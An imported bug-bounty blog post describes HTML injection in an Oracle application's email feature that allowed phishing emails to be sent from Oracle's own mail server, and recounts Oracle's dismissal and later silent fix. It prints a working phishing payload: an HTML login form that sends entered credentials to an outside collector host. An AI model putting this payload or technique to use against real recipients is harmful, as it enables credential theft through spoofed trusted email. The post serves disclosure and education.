---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-08-29_what-would-you-do-if-oracles-mailing-server-sent-you-this_2.md
original_filename: 2021-08-29_what-would-you-do-if-oracles-mailing-server-sent-you-this_2.md
title: What would you do if Oracle’s mailing server sent you this?
category: documents
detected_topics:
- xss
- command-injection
- cloud-security
tags:
- imported
- documents
- xss
- command-injection
- cloud-security
language: en
raw_sha256: 309b066875647c505362880e40f058ec6b80ff300e6ff462854b40aaddc4aad7
text_sha256: 2e070f4947c768e03f2925544771e732ec088ead51187965f9584bfcf212d973
ingested_at: '2026-06-28T07:32:07Z'
sensitivity: unknown
redactions_applied: false
---

# What would you do if Oracle’s mailing server sent you this?

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-08-29_what-would-you-do-if-oracles-mailing-server-sent-you-this_2.md
- Source Type: markdown
- Detected Topics: xss, command-injection, cloud-security
- Ingested At: 2026-06-28T07:32:07Z
- Redactions Applied: False
- Raw SHA256: `309b066875647c505362880e40f058ec6b80ff300e6ff462854b40aaddc4aad7`
- Text SHA256: `2e070f4947c768e03f2925544771e732ec088ead51187965f9584bfcf212d973`


## Content

---
title: "What would you do if Oracle’s mailing server sent you this?"
url: "https://medium.com/@iambroot/what-would-you-do-if-oracles-mailing-server-sent-you-this-bc275b1bf967"
authors: ["I am Broot"]
programs: ["Oracle"]
bugs: ["HTML injection"]
publication_date: "2021-08-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3374
scraped_via: "browseros"
---

# What would you do if Oracle’s mailing server sent you this?

What would you do if Oracle’s mailing server sent you this?
Phishing via. HTML Injection!
I am Broot
Follow
4 min read
·
Aug 29, 2021

44

This blog talks about how a case of weak input validation in an Oracle product allowed me to trigger phishing emails to anyone in the world via. Oracle’s mailing server. Oracle’s response to the find is something I feel many security researchers will relate to :’)

Background

The vulnerable application captures user-oriented metrics such as utilization and logs, that can be viewed and exported for further processing. As part of other functionalities, the application allows its users to email these metrics to a user-defined email address.

The vulnerability

Like any other email functionality, the application allows users to enter an email address in the “To” input field, along with a “Subject” and “Body”. I sent out a test email to my personal email ID with the below input in the “Body” field.

<h1>ORACLE REPORT</h1>

Soon after I triggered the email from the application, I received an email with the above input, parsed as HTML code.

Note that the email is triggered from one of Oracle’s mailing servers. This confirmed that the application did not validate user input thereby allowing arbitrary HTML code to be rendered as part of the email body; typical HTML Injection.

Get I am Broot’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

To show a proof of concept of how such a vulnerability can be exploited to perform social engineering attacks such as spear phishing, I crafted the below payload and triggered another email.

<html><head></head><body><h1>Get ready to be surprised! Login using Facebook to know more! </h1><form action=”http://test.burpcollaborator.net" method=”get” target=”_blank”><label for=”emailId”>Email ID</label><input type=”text” id=”emailID” name=”emailID”><br><br><label for=”password”>Password</label><input type=”text” id=”password” name=”password”><br><br><input type=”submit” value=”LOG IN”></form><br/><img src=”https://imagerepository.com/image.png" width=”300" height=”300" /></body></html>

After a couple of minutes, as expected, I received an email from noreply@oracle.com with my HTML payload in the body. Now using this functionality, I could send such emails to anyone in the world and wait for unsuspecting victims to take action on the email.

Press enter or click to view image in full size

Once an unsuspecting victim enters their valid credentials and clicks the “LOG IN” button, the credentials would be captured by the attacker’s server (in this case, I used Burp Collaborator) thereby gaining access to the victim’s social media account credentials (actually anything, depending on the email body).

Press enter or click to view image in full size
Impact

The application has a sign-up feature and allows users to create accounts. Not just this, the newly created user by default is attached with an administrator role (the only role that has access to the email functionality). The user can obtain an email dump via many techniques such as Google Dorks and send out phishing emails to any of these users. In short, anyone can create an account and send out phishing emails to anyone with the email content appearing to be legitimate since the email is received from the Oracle mailing server noreply@oracle.com

The outcome

Well, I ended up reporting this vulnerability to Oracle. They dismissed the issue saying they do not consider this as a risk and is an intended functionality and works as per design. Multiple emails were sent back and forth regarding its impact, but the team stood their ground and rejected the find.

A couple of months later, I could see that they fixed the issue by implementing output encoding and no longer have the user input parsed without sanitization.

The application no longer parses the email body.

When asked about why they dismissed my report (as not a risk), but later fix the issue, they mentioned that this was fixed as a functionality upgrade and not because they considered this as a vulnerability. Lol anyway, I’ve seen such responses and silent patches on several occasions and I don’t see this mindset going away anytime soon.

Feedback and insights on the blog are highly appreciated. Feel free to comment or reach out to me on Twitter/Linkedin.
